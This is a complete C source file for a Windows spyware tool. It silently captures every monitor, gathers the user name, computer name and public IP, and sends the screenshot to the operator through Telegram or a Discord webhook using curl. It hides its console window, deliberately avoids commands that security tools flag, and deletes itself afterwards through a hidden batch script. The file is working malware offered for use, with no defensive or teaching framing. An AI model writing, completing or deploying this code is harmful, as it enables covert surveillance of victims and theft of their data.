/*
 * screen_grab.c — Captures screenshot of ALL monitors as PNG
 *
 * HOW IT WORKS:
 * 1. Gets virtual screen dimensions (all monitors combined)
 * 2. Captures entire virtual desktop using GDI BitBlt
 * 3. Encodes as PNG via GDI+ flat API (loaded dynamically)
 * 4. Sends to Telegram/Discord
 * 5. Cleans up and self-deletes
 *
 * Uses native Windows APIs:
 * - gdi32.lib for screen capture (BitBlt, CreateCompatibleDC)
 * - user32.lib for GetSystemMetrics (virtual screen)
 * - gdiplus.dll loaded at runtime for PNG encoding
 * - No PowerShell, no flagged commands
 *
 * Compile: python build.py screen --telegram --token X --chat Y
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

// ══════════════════════════════════════════════════
// EXFIL CONFIG
// ══════════════════════════════════════════════════

#if !defined(USE_TELEGRAM) && !defined(USE_DISCORD)
#define USE_TELEGRAM
#endif

#ifndef TG_TOKEN
#define TG_TOKEN "YOUR_BOT_TOKEN"
#endif

#ifndef TG_CHAT
#define TG_CHAT "YOUR_CHAT_ID"
#endif

#ifndef DC_WEBHOOK
#define DC_WEBHOOK "YOUR_WEBHOOK_URL"
#endif

// ══════════════════════════════════════════════════
// GDI+ flat API types and function pointers
// (Loaded dynamically to avoid C++ header issues)
// ══════════════════════════════════════════════════

typedef int GpStatus;
typedef void GpBitmap;
typedef void GpImage;

typedef struct {
    UINT32 GdiplusVersion;
    void *DebugEventCallback;
    BOOL SuppressBackgroundThread;
    BOOL SuppressExternalCodecs;
} GdiplusStartupInput;

typedef struct {
    UINT32 Data1;
    UINT16 Data2;
    UINT16 Data3;
    BYTE Data4[8];
} GUID_t;

// PNG encoder CLSID: {557CF406-1A04-11D3-9A73-0000F81EF32E}
static const GUID_t CLSID_PNG = {
    0x557CF406, 0x1A04, 0x11D3,
    {0x9A, 0x73, 0x00, 0x00, 0xF8, 0x1E, 0xF3, 0x2E}
};

// Function pointer types
typedef GpStatus (__stdcall *fn_GdiplusStartup)(ULONG_PTR*, const GdiplusStartupInput*, void*);
typedef void (__stdcall *fn_GdiplusShutdown)(ULONG_PTR);
typedef GpStatus (__stdcall *fn_GdipCreateBitmapFromHBITMAP)(HBITMAP, HPALETTE, GpBitmap**);
typedef GpStatus (__stdcall *fn_GdipSaveImageToFile)(GpImage*, const WCHAR*, const GUID_t*, const void*);
typedef GpStatus (__stdcall *fn_GdipDisposeImage)(GpImage*);

static fn_GdiplusStartup pGdiplusStartup;
static fn_GdiplusShutdown pGdiplusShutdown;
static fn_GdipCreateBitmapFromHBITMAP pGdipCreateBitmapFromHBITMAP;
static fn_GdipSaveImageToFile pGdipSaveImageToFile;
static fn_GdipDisposeImage pGdipDisposeImage;

static HMODULE hGdiPlus = NULL;

int load_gdiplus() {
    hGdiPlus = LoadLibraryA("gdiplus.dll");
    if (!hGdiPlus) return 0;

    pGdiplusStartup = (fn_GdiplusStartup)GetProcAddress(hGdiPlus, "GdiplusStartup");
    pGdiplusShutdown = (fn_GdiplusShutdown)GetProcAddress(hGdiPlus, "GdiplusShutdown");
    pGdipCreateBitmapFromHBITMAP = (fn_GdipCreateBitmapFromHBITMAP)GetProcAddress(hGdiPlus, "GdipCreateBitmapFromHBITMAP");
    pGdipSaveImageToFile = (fn_GdipSaveImageToFile)GetProcAddress(hGdiPlus, "GdipSaveImageToFile");
    pGdipDisposeImage = (fn_GdipDisposeImage)GetProcAddress(hGdiPlus, "GdipDisposeImage");

    if (!pGdiplusStartup || !pGdiplusShutdown || !pGdipCreateBitmapFromHBITMAP ||
        !pGdipSaveImageToFile || !pGdipDisposeImage) {
        FreeLibrary(hGdiPlus);
        hGdiPlus = NULL;
        return 0;
    }
    return 1;
}

// ══════════════════════════════════════════════════
// Machine info (cached)
// ══════════════════════════════════════════════════

static char g_caption[512] = {0};

void init_info() {
    if (g_caption[0] != 0) return;
    char compName[256], userName[256], pubIP[64] = {0};
    DWORD s1 = sizeof(compName), s2 = sizeof(userName);
    GetComputerNameA(compName, &s1);
    GetUserNameA(userName, &s2);

    system("C:\\Windows\\System32\\curl.exe -s ipinfo.io/ip > %temp%\\ip.txt 2>nul");
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    char ipf[MAX_PATH];
    snprintf(ipf, MAX_PATH, "%sip.txt", tmp);
    FILE *f = fopen(ipf, "r");
    if (f) { fgets(pubIP, sizeof(pubIP), f); fclose(f); DeleteFileA(ipf); }
    char *nl = strchr(pubIP, '\n'); if (nl) *nl = 0;
    nl = strchr(pubIP, '\r'); if (nl) *nl = 0;

    int vw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int nmon = GetSystemMetrics(SM_CMONITORS);

    snprintf(g_caption, sizeof(g_caption),
        "ScreenGrab_%s@%s [%s] %dx%d (%d monitors)",
        userName, compName, pubIP, vw, vh, nmon);
}

// ══════════════════════════════════════════════════
// Multi-monitor screenshot → PNG
// ══════════════════════════════════════════════════

int capture_screen(const char *outpath) {
    // Virtual screen = bounding rect of all monitors
    int vx = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    if (width <= 0 || height <= 0) return 0;

    // Capture via GDI
    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) return 0;

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    if (!hdcMem) {
        ReleaseDC(NULL, hdcScreen);
        return 0;
    }

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    if (!hBitmap) {
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return 0;
    }

    HGDIOBJ hOld = SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, vx, vy, SRCCOPY);
    SelectObject(hdcMem, hOld);

    // Load GDI+ and save as PNG
    if (!load_gdiplus()) {
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return 0;
    }

    GdiplusStartupInput gdipInput;
    ZeroMemory(&gdipInput, sizeof(gdipInput));
    gdipInput.GdiplusVersion = 1;
    ULONG_PTR gdipToken = 0;

    if (pGdiplusStartup(&gdipToken, &gdipInput, NULL) != 0) {
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return 0;
    }

    GpBitmap *gpBitmap = NULL;
    pGdipCreateBitmapFromHBITMAP(hBitmap, NULL, &gpBitmap);

    int result = 0;
    if (gpBitmap) {
        wchar_t wPath[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, outpath, -1, wPath, MAX_PATH);

        GpStatus status = pGdipSaveImageToFile((GpImage*)gpBitmap, wPath, &CLSID_PNG, NULL);
        result = (status == 0) ? 1 : 0;

        pGdipDisposeImage((GpImage*)gpBitmap);
    }

    pGdiplusShutdown(gdipToken);
    FreeLibrary(hGdiPlus);

    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    return result;
}

// ══════════════════════════════════════════════════
// Send to Telegram/Discord
// ══════════════════════════════════════════════════

void send_file(const char *filepath) {
    init_info();
    char cmd[2048];

#ifdef USE_TELEGRAM
    snprintf(cmd, sizeof(cmd),
        "C:\\Windows\\System32\\curl.exe -s "
        "-F \"chat_id=" TG_CHAT "\" "
        "-F \"document=@%s\" "
        "-F \"caption=%s\" "
        "\"https://api.telegram.org/bot" TG_TOKEN "/sendDocument\" >nul 2>nul",
        filepath, g_caption);
#endif

#ifdef USE_DISCORD
    snprintf(cmd, sizeof(cmd),
        "C:\\Windows\\System32\\curl.exe -s "
        "-F \"file=@%s\" "
        "-F \"payload_json={\\\"content\\\":\\\"%s\\\"}\" "
        "\"" DC_WEBHOOK "\" >nul 2>nul",
        filepath, g_caption);
#endif

    system(cmd);
}

// ══════════════════════════════════════════════════
// Self-delete
// ══════════════════════════════════════════════════

void self_delete() {
    char exePath[MAX_PATH], batPath[MAX_PATH], tmp[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    GetTempPathA(MAX_PATH, tmp);
    snprintf(batPath, MAX_PATH, "%ssg_del.bat", tmp);

    FILE *bat = fopen(batPath, "w");
    if (!bat) return;
    fprintf(bat,
        "@echo off\n"
        ":retry\n"
        "del /f \"%s\" >nul 2>nul\n"
        "if exist \"%s\" (ping -n 1 127.0.0.1 >nul & goto retry)\n"
        "del /f \"%%~f0\" >nul 2>nul\n",
        exePath, exePath);
    fclose(bat);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));

    char batCmd[MAX_PATH + 16];
    snprintf(batCmd, sizeof(batCmd), "cmd.exe /c \"%s\"", batPath);
    CreateProcessA(NULL, batCmd, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

// ══════════════════════════════════════════════════
// Main
// ══════════════════════════════════════════════════

int main() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    char outFile[MAX_PATH];
    snprintf(outFile, MAX_PATH, "%ssg.png", tempPath);

    if (capture_screen(outFile)) {
        send_file(outFile);
    }

    DeleteFileA(outFile);
    self_delete();

    return 0;
}
